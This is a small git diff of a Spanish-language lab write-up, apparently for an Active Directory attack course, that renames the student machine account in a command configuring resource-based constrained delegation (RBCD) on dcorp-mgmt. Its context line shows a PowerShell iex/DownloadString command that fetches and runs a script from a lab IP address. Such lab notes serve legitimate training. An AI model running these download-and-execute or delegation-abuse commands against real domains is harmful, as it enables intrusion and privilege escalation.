@@ -1313,7 +1313,7 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Power
 
 Ahora configuraremos *RBCD* en *dcorp-mgmt* para las maquinas virtuales de los estudiantes
 ```shell
-Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student97$' -Verbose
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std97$' -Verbose
 ```
 
 Ahora comprobaremos si el *RBCD* esta bien configurado
